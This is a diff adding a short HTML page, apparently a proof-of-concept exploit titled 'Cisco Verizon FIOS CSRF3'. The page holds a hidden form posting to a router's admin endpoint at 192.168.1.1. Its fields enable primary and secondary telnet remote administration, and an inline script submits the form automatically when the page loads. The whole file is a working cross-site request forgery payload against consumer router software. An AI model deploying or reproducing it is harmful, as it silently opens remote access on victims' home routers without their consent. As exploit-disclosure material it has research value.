@@ -1,0 +1,30 @@
+ <html>
+<title>Cisco Verizon FIOS CSRF3 - Enable Remote Administration</title>
+
+<body>
+<form name="verizonCiscoRemote" action="http://192.168.1.1/index.cgi" method="post">
+<input type="hidden" name="active_page" value="9078"/>
+<input type="hidden" name="active_page_str" value="page_remote_admin"/>
+<input type="hidden" name="page_title" value="Remote Administration"/>
+<input type="hidden" name="mimic_button_field" value="submit_button_submit: .."/>
+<input type="hidden" name="button_value" value=""/>
+<input type="hidden" name="strip_page_top" value="0"/>
+<input type="hidden" name="is_telnet_primary" value="1"/>
+<input type="hidden" name="is_telnet_primary_defval" value="0"/>
+<input type="hidden" name="is_telnet_secondary_defval" value="0"/>
+<input type="hidden" name="is_telnet_ssl_defval" value="0"/>
+<input type="hidden" name="is_http_primary_defval" value="0"/>
+<input type="hidden" name="is_http_secondary_defval" value="0"/>
+<input type="hidden" name="is_https_primary_defval" value="0"/>
+<input type="hidden" name="is_https_secondary_defval" value="0"/>
+<input type="hidden" name="is_diagnostics_icmp_defval" value="0"/>
+<input type="hidden" name="is_diagnostics_traceroute_defval" value="0"/>
+<input type="hidden" name="is_telnet_secondary" value="1"/>
+</form>
+   
+<script>
+function CSRF1() {document.verizonCiscoRemote.submit();};window.setTimeout(CSRF1,0000)
+</script>
+</body>
+
+</html> 
